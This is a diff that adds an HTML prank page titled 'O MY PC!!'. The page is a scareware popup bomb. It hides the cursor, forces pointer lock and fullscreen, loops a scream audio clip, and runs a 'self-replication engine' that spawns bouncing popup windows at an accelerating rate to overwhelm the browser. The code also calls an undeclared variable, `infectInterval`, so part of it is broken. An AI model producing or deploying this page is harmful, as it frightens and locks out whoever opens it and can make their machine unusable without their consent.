@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>O MY PC!!</title>
+<style>
+  *{margin:0;padding:0;overflow:hidden;}
+  body,html{height:100%;background:#000;image-rendering:pixelated;cursor:none !important;}
+  #gif{background:#000;position:fixed;inset:0;width:100%;height:100%;object-fit:cover;pointer-events:none;}
+</style>
+</head>
+<body>
+
+<img id="gif" src="https://github.com/d3add3v/Declare-pc-dead/raw/main/assets/gif.gif">
+
+<audio id="scream" loop>
+  <source src="https://github.com/d3add3v/Declare-pc-dead/raw/refs/heads/main/assets/aud.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+// ────────────────────────────────────────────────
+const mainAudio = document.getElementById('scream');
+mainAudio.volume = 0.65;
+mainAudio.play().catch(()=>{});
+
+// Try to force audio on interaction
+document.addEventListener('click', ()=>{ mainAudio.play().catch(()=>{}); }, {once:true});
+
+// Aggressive pointer lock + fullscreen
+function tryLockAndFullscreen() {
+  const el = document.documentElement;
+  // Pointer lock
+  if (el.requestPointerLock)       el.requestPointerLock();
+  else if (el.mozRequestPointerLock) el.mozRequestPointerLock();
+  else if (el.webkitRequestPointerLock) el.webkitRequestPointerLock();
+  // Fullscreen
+  if (el.requestFullscreen)       el.requestFullscreen().catch(()=>{});
+  else if (el.mozRequestFullScreen) el.mozRequestFullScreen().catch(()=>{});
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
+}
+
+['click','mousemove','touchstart'].forEach(evt=>{
+  document.addEventListener(evt, tryLockAndFullscreen, {once:true, passive:true});
+});
+
+// ──── Hell popup ────────────────────────────────────────────────────────
+function spawnHellPopup(parentX=null, parentY=null) {
+  const w = 420;
+  const h = 340;
+  
+  let x = parentX ?? Math.random() * (screen.availWidth - w);
+  let y = parentY ?? Math.random() * (screen.availHeight - h);
+  
+  const win = window.open(
+    '',
+    '_blank',
+    `width=${w},height=${h},top=${y},left=${x},menubar=no,toolbar=no,location=no,status=no,scrollbars=no`
+  );
+
+  if (!win) return null;
+
+  win.document.write(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <style>
+        *{margin:0;padding:0;overflow:hidden;}
+        body,html{height:100%;background:#000;cursor:none;image-rendering:pixelated;}
+        img{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;}
+      </style>
+    </head>
+    <body>
+      <img src="https://github.com/d3add3v/Declare-pc-dead/raw/main/assets/gif.gif">
+      <audio autoplay loop>
+        <source src="https://github.com/d3add3v/Declare-pc-dead/raw/refs/heads/main/assets/aud.mp3" type="audio/mpeg">
+      </audio>
+    </body>
+    </html>
+  `);
+
+  // Ultra fast bouncing (even more aggressive)
+  let dx = (Math.random()>0.5 ? 1:-1) * (18 + Math.random()*24);   // 18–42 px per frame
+  let dy = (Math.random()>0.5 ? 1:-1) * (18 + Math.random()*24);
+
+  const bouncer = setInterval(() => {
+    if (win.closed) { clearInterval(bouncer); return; }
+
+    x += dx;
+    y += dy;
+
+    // Bounce on screen edges
+    if (x <= 0 || x >= screen.availWidth - w)  { dx = -dx; x = Math.max(0, Math.min(x, screen.availWidth-w)); }
+    if (y <= 0 || y >= screen.availHeight - h) { dy = -dy; y = Math.max(0, Math.min(y, screen.availHeight-h)); }
+
+    try { win.moveTo(Math.round(x), Math.round(y)); } catch(e){}
+  }, 22);   // ~45 fps movement — very fast & jittery
+
+  return win;
+}
+
+// Self-replication engine
+function infect() {
+  const newWindow = spawnHellPopup();
+  if (!newWindow) return;
+
+  // Each window creates 1–3 children after short random delay
+  setTimeout(() => {
+    const children = 1 + Math.floor(Math.random()*3);
+    for (let i = 0; i < children; i++) {
+      setTimeout(() => {
+        spawnHellPopup(newWindow.screenX, newWindow.screenY);
+      }, 400 + Math.random()*1200);
+    }
+  }, 600 + Math.random()*900);
+}
+
+// Start spreading
+setInterval(infect, 480);
+
+// After 12 seconds → exponential phase
+setTimeout(() => {
+  clearInterval(infectInterval);
+  setInterval(infect, 220);
+}, 12000);
+
+</script>
+</body>
+</html>
